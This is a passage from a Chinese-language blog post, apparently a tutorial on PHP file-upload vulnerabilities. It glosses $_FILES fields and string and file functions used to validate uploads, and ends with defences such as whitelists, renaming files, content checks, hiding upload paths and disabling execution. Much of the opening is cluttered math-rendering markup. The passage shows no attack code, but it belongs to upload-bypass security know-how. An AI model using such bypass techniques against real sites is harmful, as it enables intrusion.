class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mrow></mrow><mi>F</mi></msub><mi>I</mi><mi>L</mi><mi>E</mi><mi>S</mi><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>f</mi><mi>i</mi><mi>l</mi><msup><mi>e</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">]</mo><msup><mo stretchy=\"false\">[</mo><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mi>n</mi><mi>a</mi><mi>m</mi><msup><mi>e</mi><mo mathvariant=\"normal\" lspace=\"0em\" rspace=\"0em\">′</mo></msup><mo stretchy=\"false\">]</mo><mi mathvariant=\"normal\">/</mi><mi mathvariant=\"normal\">/</mi><mtext>客户端上传的文件原名称，含扩展名</mtext></mrow><annotation encoding=\"application/x-tex\">_FILES[&#x27;file&#x27;][&#x27;name&#x27;] //客户端上传的文件原名称，含扩展名</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.001892em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.32833099999999993em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathdefault mtight\" style=\"margin-right:0.13889em;\">F</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord mathdefault\" style=\"margin-right:0.07847em;\">I</span><span class=\"mord mathdefault\">L</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">E</span><span class=\"mord mathdefault\" style=\"margin-right:0.05764em;\">S</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathdefault\" style=\"margin-right:0.10764em;\">f</span><span class=\"mord mathdefault\">i</span><span class=\"mord mathdefault\" style=\"margin-right:0.01968em;\">l</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mopen\"><span class=\"mopen\">[</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mord mathdefault\">n</span><span class=\"mord mathdefault\">a</span><span class=\"mord mathdefault\">m</span><span class=\"mord\"><span class=\"mord mathdefault\">e</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.751892em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">′</span></span></span></span></span></span></span></span></span><span class=\"mclose\">]</span><span class=\"mord\">/</span><span class=\"mord\">/</span><span class=\"mord cjk_fallback\">客</span><span class=\"mord cjk_fallback\">户</span><span class=\"mord cjk_fallback\">端</span><span class=\"mord cjk_fallback\">上</span><span class=\"mord cjk_fallback\">传</span><span class=\"mord cjk_fallback\">的</span><span class=\"mord cjk_fallback\">文</span><span class=\"mord cjk_fallback\">件</span><span class=\"mord cjk_fallback\">原</span><span class=\"mord cjk_fallback\">名</span><span class=\"mord cjk_fallback\">称</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord cjk_fallback\">含</span><span class=\"mord cjk_fallback\">扩</span><span class=\"mord cjk_fallback\">展</span><span class=\"mord cjk_fallback\">名</span></span></span></span>_FILES ['file']['type'] // 上传的文件类型 $_FILES ['file']['tmp_name'] // 文件上传后，在服务器端存储的临时文件名 stripos (string $haystack,string $needle [,int $offset = 0])// 查找字符串首次出现的位置（不区分大小写）strrpos (string $haystack,string $needle [,int $offset = 0])// 计算指定字符串在目标字符串中最后一次出现的位置 move_uploaded_file (string $filename,string $destination) // 文件上传后先存储于服务器的临时目录中，使用该函数移动文件位置 substr (string $string,int $start [,int $length]) // 返回字符串 string 中从位置 start 处后的长度为 length 部分 strrchr (string $haystack,mixed $needle) // 返回 haystack 字符串中的一部分，这部分以 needle 的最后出现位置开始，直到 haystack 末尾 in_array (mixed $needle,array $haystack [,bool $strict = FALSE])// 在数组 haystack 中搜索是否存在值 needle，strict 若设置 TRUE，则类型也会匹配</p>\n<p>总结<br />\n防御<br />\n 38.\t黑白名单；<br />\n39.\t对上传的文件重命名，不易被猜测；<br />\n40.\t对上传的内容进行读取检查；<br />\n41.\t不要暴露上传文件的位置；<br />\n42.\t禁用上传文件的执行权限；<br />\n不同系统有不同的需求，根据系统需求制定特定的防御手段。</p>\n",
            "tags": []
        }
    ]
}